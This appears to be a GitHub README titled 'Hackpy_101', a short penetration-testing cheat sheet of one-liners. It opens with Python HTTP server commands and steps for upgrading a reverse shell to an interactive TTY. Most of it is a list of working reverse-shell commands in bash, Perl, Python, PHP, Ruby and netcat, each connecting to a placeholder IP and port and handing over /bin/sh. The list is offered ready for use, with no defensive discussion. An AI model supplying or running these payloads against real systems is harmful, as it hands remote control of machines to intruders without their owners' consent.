# Hackpy_101
Contains Various one liner scripts of python to help you in the Ethical hacking.

**For HTTP SERVER**
Python2 :- python -m SimpleHTTPServer <port>
Python3 :- python -m  http.server <port>
To open a sever on specific IP we use -- bind 
For ex- python -m http.server port --bind <IP> 
If this doesnt work use python2 version.
--------------x-------x--------xx-------------xxx----------x------------------x-----------------xxx---------------------x---------------------xxxxx--------x-----------------------

**For Requesting a Interactive Shell in Python**
python -c 'import pty; pty.spawn("/bin/bash")'
This will upgrade a dumb shell to an interactive one
If this doesnt work for you then try doing this step wise 

# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
--------------x-------x--------xx-------------xxx----------x------------------x-----------------xxx---------------------x---------------------xxxxx--------x---------------------

**THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER**
THIS IS USED FOR REVERSE CONNECTIONS.
IF YOU DONT KNOW WHAT THIS MEANS --> "GOOGLE IT!!"
YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM
# BASH
bash -i >& /dev/tcp/IP/PORT 0>&1

# PERL
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh IP PORT
--------------x-------x--------xx-------------xxx----------x------------------x-----------------xxx---------------------x---------------------xxxxx--------x---------------------

